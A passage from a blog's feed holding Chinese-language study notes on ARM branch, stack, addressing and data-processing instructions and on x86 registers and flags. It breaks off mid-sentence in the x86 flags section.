    
  </entry>
  
  <entry>
    <title>ARM(二)</title>
    <link href="http://righte0us.cc/2017/02/25/ARM2/"/>
    <id>http://righte0us.cc/2017/02/25/ARM2/</id>
    <published>2017-02-25T05:02:53.000Z</published>
    <updated>2017-06-04T05:31:12.124Z</updated>
    
    <content type="html"><![CDATA[<h2 id="分支语句"><a href="#分支语句" class="headerlink" title="分支语句"></a>分支语句</h2><p><img src="/images/arm/arm3.png" alt=""></p><p>a. 分支指令B</p><pre><code>B{&lt;cond&gt;}label          跳转到label处执行，PC=label</code></pre><a id="more"></a><p>例：</p><pre><code>backword    SUB R1,R1,#1            CMP R1,#0           比较R1和0            BEQ forward         如果R1=0，跳转到forware处执行            SUB R1,R2,#3            SUB R1,R1,#1forward     ADD R1,R2,#4            ADD R2,R3,#2            B backword          无条件跳转到backword处执行</code></pre><p>b. 带返回的分支指令BL</p><pre><code>BL{&lt;cond&gt;}label         在跳转之前，将PC的当前内容保存在R14(LR)中保存，因此，可以通过将R14的内容重新加载到PC中，返回到跳转指令之后的指令处执行。该指令用于实现子程序的调用，程序的返回可通过把LR寄存器的值复制到PC寄存器中来实现。</code></pre><p>例：</p><pre><code>BL func             跳转到子程序ADD R1,R2,#2        子程序调用完返回后执行的语句，返回地址....func                子程序...MOV R15,R14         复制返回地址到PC，实现子程序的返回</code></pre><p>c. 带状态切换的分支指令BX</p><pre><code>BX{&lt;cond&gt;} Rm       当执行BX指令时，如果条件cond满足，则处理器会判断Rm的位[0]是否为1，如果为1则跳转时自动将CPSR寄存器的标志T置位，并将目标地址的代码解释为Thumb代码来执行，则处理器会切换到Thumb状态，反之，若Rm的位[0]为0，则跳转时自动将CPSR寄存器的标志T复位，并将目标地址处的代码解释为ARM代码来执行，即处理器会切换到ARM状态。</code></pre><p>注意：bx lr的作用等同于mov pc,lr。即跳转到lr中存放的地址处。 非零值存储在R0中返回。</p><p>那么lr存放的是什么地址呢？lr就是连接寄存器(Link Register, LR)，在ARM体系结构中LR的特殊用途有两种：一是用来保存子程序返回地址；二是当异常发生时，LR中保存的值等于异常发生时PC的值减4（或者减2），因此在各种异常模式下可以根据LR的值返回到异常发生前的相应位置继续执行。　　</p><p>当通过BL或BLX指令调用子程序时，硬件自动将子程序返回地址保存在R14寄存器中。在子程序返回时，把LR的值复制到程序计数器PC即可实现子程序返回。</p><h2 id="堆栈"><a href="#堆栈" class="headerlink" title="堆栈"></a>堆栈</h2><p>a. 进栈出栈</p><p>出栈使用LDM指令，进栈使用STM指令。LDM和STM指令往往结合下面一些参数实现堆栈的操作。</p><pre><code>FD:满递减堆栈。ED:空递减堆栈。FA:满递增堆栈。EA:空递增堆栈。</code></pre><p>满堆栈是指SP(R13)指向堆栈的最后一个已使用地址或满位置(也就是SP指向堆栈的最后一个数据项的位置)；相反，空堆栈是指SP指向堆栈的第一个没有使用的地址或空位置。<br>LDMFD和STMFD分别指POP出栈和PUSH入栈<br>b. PUSH指令</p><pre><code>PUSH{cond} reglist      PUSH将寄存器推入满递减堆栈PUSH {r0,r4-r7}         将R0,R4-R7寄存器内容压入堆栈</code></pre><p>c. POP指令</p><pre><code>POP{cond} reglist       POP从满递减堆栈中弹出数据到寄存器POP {r0,r4-r7}          将R0,R4-R7寄存器从堆栈中弹出</code></pre><p>。。。。。。<br>。。。。。<br>。。。。<br>。。。<br>。。<br>。</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;分支语句&quot;&gt;&lt;a href=&quot;#分支语句&quot; class=&quot;headerlink&quot; title=&quot;分支语句&quot;&gt;&lt;/a&gt;分支语句&lt;/h2&gt;&lt;p&gt;&lt;img src=&quot;/images/arm/arm3.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;a. 分支指令B&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;B{&amp;lt;cond&amp;gt;}label          跳转到label处执行，PC=label
&lt;/code&gt;&lt;/pre&gt;
    
    </summary>
    
    
      <category term="Foundation" scheme="http://righte0us.cc/tags/Foundation/"/>
    
  </entry>
  
  <entry>
    <title>ARM(一)</title>
    <link href="http://righte0us.cc/2017/02/15/ARM/"/>
    <id>http://righte0us.cc/2017/02/15/ARM/</id>
    <published>2017-02-15T05:02:53.000Z</published>
    <updated>2017-06-04T05:31:24.148Z</updated>
    
    <content type="html"><![CDATA[<h1 id="ARM寄存器"><a href="#ARM寄存器" class="headerlink" title="ARM寄存器"></a>ARM寄存器</h1><h2 id="通用寄存器"><a href="#通用寄存器" class="headerlink" title="通用寄存器"></a>通用寄存器</h2><pre><code>1)未分组寄存器:R0~R7 2)分组寄存器:R8~812      R13:SP，常用作堆栈指针，始终指向堆栈的顶部，当一个数据(32位)推入堆栈时，SP(R13的值减4)向下浮动指向下一个地址，即新的栈顶，当数据从堆栈中弹出时，SP(R13的值加4)向上浮动指向新的栈顶。      R14:连接寄存器(LR),当执行BL子程序调用指令时，R14中得到R15(程序计数器PC)的备份，其他情况下，R14用作通用寄存器。        R15:程序计数器(PC):用于控制程序中指令的执行顺序。正常运行时，PC指向CPU运行的下一条指令。每次取值后PC的值会自动修改以指向下一条指令，从而保证了指令按一定的顺序执行。当程序的执行顺序发生改变(如转移)时，需要修改PC的值。</code></pre><a id="more"></a><h2 id="状态寄存器"><a href="#状态寄存器" class="headerlink" title="状态寄存器"></a>状态寄存器</h2><pre><code>CPSR(R16):当前程序状态寄存器，用来保存ALU中的当前操作信息，控制允许和禁止中断、设置处理器的工作模式等。 SPSRs:五个备份的程序状态寄存器，用来进行异常处理。当异常发生时，SPSR用于保存CPSR的当前值，从异常退出时可由SPSR来恢复CPSR。N、Z、C、V均为条件码标志位，他们的内容可被运算的结果所改变。N:正负标志，N=1表示运算的结果为负，N=0表示运算的结果为正或0Z:零标志，Z=1表示运算的结果为0，Z=0表示运算的结果为非0C:进位标志，加法运算产生了进位时则C=1，否则C=0  借位标志，减肥运算产生了借位则C=0，否则C=1V:溢出标志，V=1表示有溢出，V=0表示无溢出</code></pre><h2 id="地址空间"><a href="#地址空间" class="headerlink" title="地址空间"></a>地址空间</h2><pre><code>程序正常执行时，每执行一条ARM指令，当前指令计数器增加4个字节。</code></pre><hr><h1 id="汇编语言"><a href="#汇编语言" class="headerlink" title="汇编语言"></a>汇编语言</h1><h2 id="汇编指令格式"><a href="#汇编指令格式" class="headerlink" title="汇编指令格式"></a>汇编指令格式</h2><pre><code>&lt;opcode&gt;{&lt;cond&gt;}{S}&lt;Rd&gt;,&lt;Rn&gt;{,&lt;OP2&gt;} 格式中&lt;&gt;的内容必不可少，{}中的内容可省略 &lt;opcode&gt;:表示操作码，如ADD表示算术加法 {&lt;cond&gt;}:表示指令执行的条件域，如EQ、NE等。 {S}:决定指令的执行结果是否影响CPSR的值，使用该后缀则指令执行的结果影响CPSR的值，否则不影响 &lt;Rd&gt;:表示目的寄存器 &lt;Rn&gt;:表示第一个操作数，为寄存器 &lt;op2&gt;:表示第二个操作数，可以是立即数、寄存器或寄存器移位操作数 例:ADDEQS R0,R1,#8;其中操作码为ADD,条件域cond为EQ,S表示该指令的执行影响CPSR寄存器的值，目的寄存器Rd为R0,第一个操作数寄存器Rd为R1，第二个操作数OP2为立即数#8</code></pre><h2 id="指令的可选后缀"><a href="#指令的可选后缀" class="headerlink" title="指令的可选后缀"></a>指令的可选后缀</h2><pre><code>S：指令执行后程序状态寄存器的条件标志位将被刷新        ADDS R1,R0,#2 !:指令中的地址表达式中含有!后缀时，指令执行后，基址寄存器中的地址值将发生变化，变化的结果是：基址寄存器中的值(指令执行后)=指令执行前的值 + 地址偏移量       LDR R3,[R0,#2]!    指令执行后，R0 = R0 + 2</code></pre><h2 id="指令的条件执行"><a href="#指令的条件执行" class="headerlink" title="指令的条件执行"></a>指令的条件执行</h2><p>指令的条件后缀只是影响指令是否执行，不影响指令的内容</p><pre><code>    条件码    助记符后缀       标志                      含义    0000    EQ           Z置位                      相等    0001    NE           Z清零                      不相等    0010    CS           C指令                      无符号数大于或等于    0011    CC           C清零                      无符号数小于    0100    MI           N置位                      负数    0101    PL           N清零                      正数或零    0110    VS           V置位                      溢出    0111    VC           V清零                      未溢出    1000    HI           C置位Z清零                  无符号数大于    1001    LS           C清零Z置位                  无符号数小于或等于    1010    GE           N等于V                     带符号数大于或等于    1011    LT           N不等于V                     带符号数小于    1100    GT           Z清零且(N等于V)             带符号数大于    1101    LE           Z置位或(N不等于V)           带符号数小于或等于    1110    AL           忽略                     无条件执行</code></pre><p>例：ADDEQ R4,R3,#1 相等则相加，即CPSR中Z置位时该指令执行，否则不执行。</p><h2 id="ARM指令分类"><a href="#ARM指令分类" class="headerlink" title="ARM指令分类"></a>ARM指令分类</h2><p><img src="/images/arm/arm1.png" alt=""></p><h2 id="ARM寻址方式"><a href="#ARM寻址方式" class="headerlink" title="ARM寻址方式"></a>ARM寻址方式</h2><p>寻址方式就是根据指令中操作数的信息来寻找操作数实际物理地址的方式<br>a.立即数寻址</p><pre><code>    MOV R0,#15       #15就是立即数</code></pre><p>b.寄存器寻址</p><pre><code>    ADD R0, R1, R2    将R1和R2的内容相加，其结果存放在寄存器R0中</code></pre><p>c.寄存器间接寻址</p><pre><code>    LDR R0, [R4]      以寄存器R4的值作为操作数的地址，在存储器中取得一个操作数存入寄存器R0中</code></pre><p>d.寄存器移位寻址</p><pre><code>    ADD R0,R1,R2,LSL #1    将R2的值左移一位，所得值与R1相加，存放到R0中    MOV R0,R1,LSL R3       将R1的值左移R3位，然后将结果存放到R0中</code></pre><p>e.基址变址寻址</p><pre><code>    LDR R0,[R1,#4]    将R1的值加4作为操作数的地址，在存储器中取得操作数放入R0中    LDR R0,[R1,#4]!   将R1的值加4作为操作数的地址，在存储器中取得操作数放入R0中,然后R1 = R1+4    LDR R0,[R1],#4    R0 = [R1],R1 = R1 +4    LDR R0,[R1,R2]    R0 = [R1+R2]</code></pre><p>f.多寄存器寻址</p><p>一条指令可以完成多个寄存器值的传送(最多可传送16个通用寄存器)，连续的寄存器用“-”，否则用“，”</p><pre><code>    LDMIA R0!,{R1 - R4}   R1 = [R0],R2=[R0+4],R3=[R0+8],R4=[R0+12]</code></pre><p>后缀IA表示在每次执行玩加载/存储操作后，R0按自长度增加。<br>g.相对寻址</p><p>以程序计数器PC的当前值为基地址，指令中的地址标号作为偏移量，将两者相加之后得到操作数的有效地址，如下图的BL分支跳转</p><pre><code>         BL proc        跳转到子程序proc处执行         ...    proc MOV R0,#1         ...</code></pre><p>h.堆栈寻址</p><p>按先进先出的方式工作，堆栈指针用R13表示，总是指向栈顶，LDMFD和STMFD分别表示POP出栈和PUSH进栈</p><pre><code>    STMFD R13!,{R0 - R4};    LDMFD R13!,{R0 - R4};</code></pre><h2 id="数据处理指令"><a href="#数据处理指令" class="headerlink" title="数据处理指令"></a>数据处理指令</h2><p>a. MOV指令</p><pre><code>    MOV {&lt;cond&gt;}{S} Rd,op2          将op2传给Rd    MOV R1, R0                      将寄存器R0的值传到寄存器R1    MOV PC,R14                      将寄存器R14的值传到PC，常用于子程序返回    MOV R1,R0,LSL #3                将寄存器R0的值左移3位后传给R1    MOV R0,#5                       将立即数5传给R0</code></pre><p>b. MVN指令</p><pre><code>    MVN {&lt;cond&gt;}{S}Rd, op2          将op2取反传给Rd    MVN R0,#0                       将0取反后传给R0，R0 = -1    MVN R1,R2                       将R2取反，结果保存到R1</code></pre><p>c. 移位指令</p><pre><code>    LSL 逻辑左移    LSR 逻辑右移    ASR 算术右移    ROR 循环右移    RRX 带扩展的循环右移</code></pre><p>d. ADD加法指令</p><pre><code>    ADD{&lt;cond&gt;}{S}Rd, Rn, op2    ADD R0,R1,R2            R0 = R1 + R2    ADD R0,R1,#5            R0 = R1 + 5    ADD R0,R1,R2,LSL #2     R0 = R1 + (R2左移2位)</code></pre><p>e. ADC带进位加法指令</p><pre><code>    ADC{&lt;cond&gt;}{S} Rd,Rn,op2    将Rn的值和操作数op2相加，再加上CPSR中C条件标志位的值，并将结果保存到Rd中    例：用ADC完成64位加法，设第一个64位操作数保存在R2,R3中，第二个64位操作数放在R4,R5中，结果保存在R0,R1中    ADDS R0,R2,R4               低32位相加，产生进位    ADC R1,R3,R5                高32位相加，加上进位</code></pre><p>f. SUB减法指令</p><pre><code>    SUB{&lt;cond&gt;}{S} Rd,Rn,op2    Rd = Rn - op2    SUB R0,R1,R2                R0 = R1 - R2    SUB R0,R1,#6                R0 = R1 -6    SUB R0,R2,R3,LSL #1         R0 = R2 - (R3左移1位)</code></pre><p>g. SBC带借位减法指令</p><pre><code>    SBC{&lt;cond&gt;}{S} Rd,Rn,op2    把Rn的值减去操作数op2，再减去CPSR中的C标志位的反码，并将结果保存到Rd中，Rd = Rn - op2 - !C</code></pre><p>例:用SBC完成64位减法，设第一个64位操作数保存在R2,R3中，第二个64位操作数放在R4,R5中，结果保存在R0,R1中</p><pre><code>    SUBS R0,R2,R4       低32位相减，S影响CPSR    SBC R1,R3,R5        高32位相减，去除C的反码</code></pre><p>h. RSC带借位的逆向减法指令</p><pre><code>    RSC{&lt;cond&gt;}{S} Rd,Rn,op2    把操作数op2减去Rn，再减去CPSR中的C标志位的反码，并将结果保存到Rd中，Rd = op2 - Rn - !C</code></pre><p>i. 逻辑运算指令</p><pre><code>    AND{&lt;cond&gt;}{S} Rd,Rn,op2    按位与，Rd = Rn AND op2    ORR{&lt;cond&gt;}{S} Rd,Rn,op2    按位或，Rd = Rn OR op2    EOR{&lt;cond&gt;}{S} Rd,Rn,op2    按位异或，Rd = Rn EOR op2</code></pre><p>j. CMP比较指令</p><pre><code>    CMP{&lt;cond&gt;}{S} Rd,Rn,op2    将Rn的值和op2进行比较，同时更新CPSR中条件标志位的值(实际上是执行一次减法，但不存储结果)，当操作数Rn大于op2时，则此后带有GT后缀的指令将可以执行(根据相应的指令判断是否执行，如GT,LT等)。    CMP R1,#10                  比较R1和10，并设置CPSR的标志位    ADDGT R0,R0,#5              如果R1&gt;10,则执行ADDGT指令，将R0加5</code></pre><p>k. CMN反值比较指令</p><pre><code>    CMN{&lt;cond&gt;}{S} Rd,Rn,op2    将Rn的值和op2取反后进行比较，同时更新CPSR中条件标志位的值(实际上将Rn和op2相加)，后面的指令就可以根据条件标志位决定是否执行。      CMN R0,R1       将R0和R1相加，并设置CPSR的值</code></pre><p>l. MUL/MLA/SMULL/SMLAL/UMULL/UMLAL乘法指令</p><pre><code>    MUL     32位乘法指令    MLA     32位乘加指令    SMULL   64位有符号数乘法指令    SMLAL   64位有符号数乘加指令    UMULL   64位无符号数乘法指令    UMLAL   64位无符号数乘加指令    MUL{&lt;cond&gt;}{S} Rd,Rm,Rs         Rd = Rm * Rs    MULS R0,R1,R2    MLA{&lt;cond&gt;}{S} Rd,Rm,Rs,Rn      Rd = (Rm * Rs) + Rn    MLAS R0,R1,R2,R3</code></pre><h2 id="数据加载与存储指令"><a href="#数据加载与存储指令" class="headerlink" title="数据加载与存储指令"></a>数据加载与存储指令</h2><p><img src="/images/arm/arm2.png" alt=""></p><p>a. LDR/STR字数据加载/存储指令</p><pre><code>    LDR/STR{&lt;cond&gt;}{T}Rd,addr       LDR指令用于从存储器中将一个32位的字数据加载到目的寄存器Rd中，当程序计数器PC作为目的寄存器时，指令从存储器中读取的字数据被当做目的地址，从而可以实现程序流程的跳转。    STR指令用于从源寄存器中将一个32位的字数据存储到存储器中，和LDR相反。后缀T可选。    LDR R4,START            将存储地址为START的字数据读入R4    STR R5,DATA1            将R5存入存储地址为DATA1中    LDR R0,[R1]             将存储器地址为R1的字数据读入存储器R0    LDR R0,[R1,R2]          将存储器地址为R1+R2的字数据读入存储器R0    LDR R0,[R1,#8]          将存储器地址为R1+8的字数据读入存储器R0    LDR R0,[R1,R2,LSL #2]   将存储器地址为R1+R2*4的字数据读入存储区R0    STR R0,[R1,R2]!         将R0字数据存入存储器地址R1+R2的存储单元中，并将新地址R2+R2写入R2    STR R0,[R1,#8]!         将R0字数据存入存储器地址R1+8的存储单元中，并将新地址R2+8写入R2    STR R0,[R1,R2,LSL #2]   将R0字数据存入存储器地址R1+R2*4的存储单元中，并将新地址R2+R2*4写入R1    LDR R0,[R1],#8          将存储器地址为R1的字数据读入寄存器R0，并将新地址R1+8写入R1      LDR R0,[R1],R2          将存储器地址为R1的字数据读入寄存器R0，并将新地址R1+R2写入R1    LDR R0,[R1],R2,LSL #2   将存储器地址为R1的字数据读入寄存器R0，并将新地址R1+R2*4写入R1</code></pre><p>b. LDRB/STRB字节数据加载/存储指令</p><pre><code>    LDRB/STRB{&lt;cond&gt;}{T}Rd,addr             LDRB指令用于从存储器中将一个8位的字节数据加载到目的寄存器中，同时将寄存器的高24位清零，当程序计数器PC作为目的寄存器时，指令从存储器中读取的字数据被当做目的地址，从而可以实现程序流程的跳转。    STRB指令用于从源寄存器中将一个8位的字节数据存储到存储器中，和LDRB相反。后缀T可选。</code></pre><p>c. LDRH/STRH半字数据加载/存储指令</p><pre><code>    LDRH/STRH{&lt;cond&gt;}{T}Rd,addr             LDRH指令用于从存储器中将一个16位的半字数据加载到目的寄存器中，同时将寄存器的高16位清零，当程序计数器PC作为目的寄存器时，指令从存储器中读取的字数据被当做目的地址，从而可以实现程序流程的跳转。    STRH指令用于从源寄存器中将一个16位的半字数据存储到存储器中，和LDRH相反。后缀T可选。</code></pre><p>d. LDM/STM批量数据加载/存储指令</p><pre><code>    LDM/STM{&lt;cond&gt;}{&lt;type&gt;}Rn{!},&lt;regs&gt;{^}          LDM用于从基址寄存器所指示的一片连续存储器中读取数据到寄存器列表所指向的多个寄存器中，内存单元的起始地址为基址寄存器Rn的值，各个寄存器由寄存器列表regs表示，该指令一般用于多个寄存器数据的出栈操作    STM用于将寄存器列表所指向的多个寄存器中的值存入由基址寄存器所指向的一片连续存储器中，内存单元的起始地址为基址寄存器Rn的值，各个寄存器又寄存器列表regs表示。该指令一般用于多个寄存器数据的进栈操作。</code></pre><p>type表示类型，用于数据的存储与读取有以下几种情况：</p><pre><code>    IA：每次传送后地址值加。    IB：每次传送前地址值加。    DA: 每次传送后地址值减。    DB: 每次传送前地址值减。</code></pre><p>用于堆栈操作时有如下几种情况：</p><pre><code>    FD:满递减堆栈    ED:空递减堆栈    FA:满递增堆栈    EA:空递增堆栈</code></pre><p>e. SWP字数据交换指令</p><pre><code>    SWP{&lt;cond&gt;}&lt;Rd&gt;,&lt;Rm&gt;,[&lt;Rn&gt;]     Rd = [Rn],[Rn] = Rm,当寄存器Rm和目的寄存器Rd为同一个寄存器时，指令交换该急促亲和存储器的内容    SWP R0,R1,[R2]                  R0 = [R2],[R2] = R1    SWP R0,R0,[R1]                  R0 = [R1],[R1] = R0    SWPB指令用于将寄存器Rn指向的存储器中的字节数据加载到目的寄存器Rd中，目的寄存器的高24位清零，同时将Rm中的字数据存储到Rn指向的存储器中。</code></pre>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;ARM寄存器&quot;&gt;&lt;a href=&quot;#ARM寄存器&quot; class=&quot;headerlink&quot; title=&quot;ARM寄存器&quot;&gt;&lt;/a&gt;ARM寄存器&lt;/h1&gt;&lt;h2 id=&quot;通用寄存器&quot;&gt;&lt;a href=&quot;#通用寄存器&quot; class=&quot;headerlink&quot; title=&quot;通用寄存器&quot;&gt;&lt;/a&gt;通用寄存器&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;1)未分组寄存器:R0~R7 
2)分组寄存器:R8~812 
     R13:SP，常用作堆栈指针，始终指向堆栈的顶部，当一个数据(32位)推入堆栈时，SP(R13的值减4)向下浮动指向下一个地址，即新的栈顶，当数据从堆栈中弹出时，SP(R13的值加4)向上浮动指向新的栈顶。 
     R14:连接寄存器(LR),当执行BL子程序调用指令时，R14中得到R15(程序计数器PC)的备份，其他情况下，R14用作通用寄存器。   
     R15:程序计数器(PC):用于控制程序中指令的执行顺序。正常运行时，PC指向CPU运行的下一条指令。每次取值后PC的值会自动修改以指向下一条指令，从而保证了指令按一定的顺序执行。当程序的执行顺序发生改变(如转移)时，需要修改PC的值。
&lt;/code&gt;&lt;/pre&gt;
    
    </summary>
    
    
      <category term="Foundation" scheme="http://righte0us.cc/tags/Foundation/"/>
    
  </entry>
  
  <entry>
    <title>汇编</title>
    <link href="http://righte0us.cc/2017/01/03/%E6%B1%87%E7%BC%96/"/>
    <id>http://righte0us.cc/2017/01/03/汇编/</id>
    <published>2017-01-03T00:58:08.000Z</published>
    <updated>2017-12-08T11:23:57.959Z</updated>
    
    <content type="html"><![CDATA[<h1 id="汇编"><a href="#汇编" class="headerlink" title="汇编"></a>汇编</h1><p>汇编语言（assembly language）是一种用于电子计算机、微处理器、微控制器或其他可编程器件的低级语言，亦称为符号语言。在汇编语言中，用助记符（Mnemonics）代替机器指令的操作码，用地址符号（Symbol）或标号（Label）代替指令或操作数的地址。在不同的设备中，汇编语言对应着不同的机器语言指令集，通过汇编过程转换成机器指令。普遍地说，特定的汇编语言和特定的机器语言指令集是一一对应的,不同平台之间不可直接移植。<br><a id="more"></a></p><p>汇编语言直接同计算机的底层软件甚至硬件进行交互，它具有如下一些优点：</p><pre><code>能够直接访问与硬件相关的存储器或 I/O 端口；能够不受编译器的限制，对生成的二进制代码进行完全的控制；能够对关键代码进行更准确的控制，避免因线程共同访问或者硬件设备共享引起的死锁；能够根据特定的应用对代码做最佳的优化，提高运行速度；能够最大限度地发挥硬件的功能。</code></pre><p>同时还应该认识到，汇编语言是一种层次非常低的语言，它仅仅高于直接手工编写二进制的机器指令码，因此不可避免地存在一些缺点：</p><pre><code>编写的代码非常难懂，不好维护；很容易产生 bug，难于调试；只能针对特定的体系结构和处理器进行优化；开发效率很低，时间长且单调。</code></pre><h2 id="寄存器"><a href="#寄存器" class="headerlink" title="寄存器"></a>寄存器</h2><pre><code>32位CPU所含有的寄存器有：    4个数据寄存器(EAX、EBX、ECX和EDX)    2个变址和指针寄存器(ESI和EDI) 2个指针寄存器(ESP和EBP)    6个段寄存器(ES、CS、SS、DS、FS和GS)    1个指令指针寄存器(EIP) 1个标志寄存器(EFlags)</code></pre><p><img src="/images/x86-registers.png" alt="x86-registers"><br>X86处理器中有8个32位的通用寄存器。由于历史的原因，EAX通常用于计算，ECX通常用于循环变量计数。ESP和EBP有专门用途，ESP指示栈指针(用于指示栈顶位置)，而EBP则是基址指针（用于指示子程序或函数调用的基址指针）。如图中所示，EAX、EBX、ECX和EDX的前两个高位字节和后两个低位字节可以独立使用，其中两位低字节又被独立分为H和L部分，这样做的原因主要是考虑兼容16位的程序。应用寄存器时，其名称大小写是不敏感的，如EAX和eax没有区别。</p><h3 id="数据寄存器"><a href="#数据寄存器" class="headerlink" title="数据寄存器"></a>数据寄存器</h3><p>  数据寄存器主要用来保存操作数和运算结果等信息，从而节省读取操作数所需占用总线和访问存储器的时间。<br>  32位CPU有4个32位的通用寄存器EAX、EBX、ECX和EDX。对低16位数据的存取，不会影响高16位的数据。这些低16位寄存器分别命名为：AX、BX、CX和DX，它和先前的CPU中的寄存器相一致。</p><p>  4个16位寄存器又可分割成8个独立的8位寄存器(AX：AH-AL、BX：BH-BL、CX：CH-CL、DX：DH-DL)，每个寄存器都有自己的名称，可独立存取。程序员可利用数据寄存器的这种“可分可合”的特性，灵活地处理字/字节的信息。</p><p>  寄存器AX和AL通常称为累加器(Accumulator)，用累加器进行的操作可能需要更少时间。累加器可用于乘、除、输入/输出等操作，它们的使用频率很高；寄存器BX称为基地址寄存器(Base Register)。它可作为存储器指针来使用；寄存器CX称为计数寄存器(Count Register)。在循环和字符串操作时，要用它来控制循环次数；在位操作中，当移多位时，要用CL来指明移位的位数；寄存器DX称为数据寄存器(Data Register)。在进行乘、除运算时，它可作为默认的操作数参与运算，也可用于存放I/O的端口地址.</p><p>  在16位CPU中，AX、BX、CX和DX不能作为基址和变址寄存器来存放存储单元的地址，但在32位CPU中，其32位寄存器EAX、EBX、ECX和EDX不仅可传送数据、暂存数据保存算术逻辑运算结果，而且也可作为指针寄存器，所以，这些32位寄存器更具有通用性。 </p><h3 id="变址寄存器"><a href="#变址寄存器" class="headerlink" title="变址寄存器"></a>变址寄存器</h3><p>32位CPU有2个32位通用寄存器ESI和EDI。其低16位对应先前CPU中的SI和DI，对低16位数据的存取，不影响高16位的数据。</p><p>寄存器ESI、EDI、SI和DI称为变址寄存器(Index Register)，它们主要用于存放存储单元在段内的偏移量，用它们可实现多种存储器操作数的寻址方式，为以不同的地址形式访问存储单元提供方便。 </p><p>变址寄存器不可分割成8位寄存器。作为通用寄存器，也可存储算术逻辑运算的操作数和运算结果。它们可作一般的存储器指针使用。在字符串操作指令的执行过程中，对它们有特定的要求，而且还具有特殊的功能。</p><h3 id="指针寄存器"><a href="#指针寄存器" class="headerlink" title="指针寄存器"></a>指针寄存器</h3><p>32位CPU有2个32位通用寄存器EBP和ESP。其低16位对应先前CPU中的SBP和SP，对低16位数据的存取，不影响高16位的数据。 </p><p>寄存器EBP、ESP、BP和SP称为指针寄存器(Pointer Register)，主要用于存放堆栈内存储单元的偏移量，用它们可实现多种存储器操作数的寻址方式，为以不同的地址形式访问存储单元提供方便。指针寄存器不可分割成8位寄存器。作为通用寄存器，也可存储算术逻辑运算的操作数和运算结果。</p><p>它们主要用于访问堆栈内的存储单元，并且规定：</p><pre><code>BP为基指针(Base Pointer)寄存器，用它可直接存取堆栈中的数据；SP为堆栈指针(Stack Pointer)寄存器，用它只可访问栈顶。</code></pre><h3 id="段寄存器"><a href="#段寄存器" class="headerlink" title="段寄存器"></a>段寄存器</h3><p> 段寄存器是根据内存分段的管理模式而设置的。内存单元的物理地址由段寄存器的值和一个偏移量组合而成的，这样可用两个较少位数的值组合成一个可访问较大物理空间的内存地址。</p><p>CPU内部的段寄存器：<br>    CS——代码段寄存器(Code Segment Register)，其值为代码段的段值；<br>    DS——数据段寄存器(Data Segment Register)，其值为数据段的段值；<br>    ES——附加段寄存器(Extra Segment Register)，其值为附加数据段的段值；<br>    SS——堆栈段寄存器(Stack Segment Register)，其值为堆栈段的段值；<br>    FS——附加段寄存器(Extra Segment Register)，其值为附加数据段的段值；<br>    GS——附加段寄存器(Extra Segment Register)，其值为附加数据段的段值。</p><p>在16位CPU系统中，它只有4个段寄存器，所以，程序在任何时刻至多有4个正在使用的段可直接访问；在32位微机系统中，它有6个段寄存器，所以，在此环境下开发的程序最多可同时访问6个段。</p><p>32位CPU有两个不同的工作方式：实方式和保护方式。在每种方式下，段寄存器的作用是不同的。有关规定简单描述如下：<br>实方式:前4个段寄存器CS、DS、ES和SS与先前CPU中的所对应的段寄存器的含义完全一致，内存单元的逻辑地址仍为“段值：偏移量”的形式。为访问某内存段内的数据，必须使用该段寄存器和存储单元的偏移量。<br>保护方式:在此方式下，情况要复杂得多，装入段寄存器的不再是段值，而是称为“选择子”(Selector)的某个值。</p><h3 id="指令指针寄存器"><a href="#指令指针寄存器" class="headerlink" title="指令指针寄存器"></a>指令指针寄存器</h3><p>32位CPU把指令指针扩展到32位，并记作EIP，EIP的低16位与先前CPU中的IP作用相同。</p><p>指令指针EIP、IP(Instruction Pointer)是存放下次将要执行的指令在代码段的偏移量。在具有预取指令功能的系统中，下次要执行的指令通常已被预取到指令队列中，除非发生转移情况。所以，在理解它们的功能时，不考虑存在指令队列的情况。</p><p>在实方式下，由于每个段的最大范围为64K，所以，EIP中的高16位肯定都为0，此时，相当于只用其低16位的IP来反映程序中指令的执行次序</p><h3 id="标志寄存器"><a href="#标志寄存器" class="headerlink" title="标志寄存器"></a>标志寄存器</h3><h4 id="运算结果标志位"><a href="#运算结果标志位" class="headerlink" title="运算结果标志位"></a>运算结果标志位</h4><p>1、进位标志CF(Carry Flag)<br>进位标志CF主要用来反映运算是否产生进位或借位。如果运算结果的最高位产生了一个进位或借位，那么，其值为1，否则其值为0。使用该标志位的情况有：多字(字节)数的加减运算，无符号数的大小比较运算，移位操作，字(字节)之间移位，专门改变CF值的指令等。<br>2、奇偶标志PF(Parity Flag)<br>奇偶标志PF用于反映运算结果中“1”的个数的奇偶性。如果“1”的个数为偶数，则PF的值为1，否则其值为0。<br>利用PF可进行奇偶校验检查，或产生奇偶校验位。在数据传送过程中，为了提供传送的可靠性，如果采用奇偶校验的方法，就可使用该标志位。<br>3、辅助进位标志AF(Auxiliary Carry Flag)<br>在发生下列情况时，辅助进位标志AF的值被置为1，否则其值为0：<br>(1)在字操作时，发生低字节向高字节进位或借位时；<br>(2)在字节操作时，发生低4位向高4位进位或借位时。<br>对以上6个运算结果标志位，在一般编程情况下，标志位CF、ZF、SF和OF的使用频率较高，而标志位PF和AF的使用频率较低。<br>4、零标志ZF(Zero Flag)<br>零标志ZF用来反映运算结果是否为0。如果运算结果为0，则其值为1，否则其值为0。在判断运算结果是否为0时，可使用此标志位。<br>5、符号标志SF(Sign Flag)<br>符号标志SF用来反映运算结果的符号位，它与运算结果的最高位相同。在微机系统中，有符号数采用补码表示法，所以，SF也就反映运算结果的正负号。运算结果为正数时，SF的值为0，否则其值为1。<br>6、溢出标志OF(Overflow Flag)<br>溢出标志OF用于反映有符号数加减运算所得结果是否溢出。如果运算结果超过当前运算位数所能表示的范围，则称为溢出，OF的值被置为1，否则，OF的值被清为0。</p><h4 id="状态控制标志位"><a href="#状态控制标志位" class="headerlink" title="状态控制标志位"></a>状态控制标志位</h4><p>状态控制标志位是用来控制CPU操作的，它们要通过专门的指令才能使之发生改变。<br>1、追踪标志TF(Trap Flag)<br>当追踪标志TF被置为1时，CPU进入单步执行方式，即每执行一条指令，产生一个单步中断请求。这种方式主要用于程序的调试。<br>指令系统中没有专门的指令来改变标志位TF的值，但程序员可用其它办法来改变其值。<br>2、中断允许标志IF(Interrupt-enable 